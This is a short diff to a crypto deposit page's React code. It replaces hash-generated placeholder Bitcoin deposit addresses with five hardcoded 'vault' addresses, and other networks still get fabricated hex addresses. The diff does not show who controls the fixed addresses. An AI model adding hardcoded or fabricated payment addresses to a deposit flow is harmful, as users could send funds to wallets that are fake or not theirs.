@@ -49,6 +49,14 @@ const COIN_NETWORKS: Record<DepositCoin, { label: string; networkKey: string; no
   ],
 };
 
+const BTC_VAULT_ADDRESSES = [
+  "bc1qejrhpwau5kw5yuv5mg6grvny2ezzd06xqvdrh3",
+  "bc1qc3gpaf9ve3crg7p92q55m5afar8v5rqck3ldxj",
+  "bc1q7ngavwcymaw6vyywxc7dffpntjv73cfqy7mjkz",
+  "bc1ql2vreymfjvm2tgsh8ymlclehr0yz46hdklcjt2",
+  "bc1qeswlarfqyaf8kgnjqa5ct3jayap3lmt7v32zag",
+];
+
 export const DepositPage: React.FC<DepositPageProps> = ({
   onClose,
   onDone,
@@ -188,7 +196,8 @@ export const DepositPage: React.FC<DepositPageProps> = ({
       }
       return res;
     } else if (netLower.includes('bitcoin') || depositCoin === 'BTC') {
-      return `bc1q${Math.abs(h1).toString(16).padStart(8, '0')}${Math.abs(h2).toString(16).padStart(8, '0')}`.slice(0, 42);
+      const idx = Math.abs(h1) % BTC_VAULT_ADDRESSES.length;
+      return BTC_VAULT_ADDRESSES[idx];
     } else {
       const hex = `${Math.abs(h1).toString(16).padStart(8, '0')}${Math.abs(h2).toString(16).padStart(8, '0')}${Math.abs(h1 ^ h2).toString(16).padStart(8, '0')}`;
       return `0x${hex.repeat(3).slice(0, 40)}`;
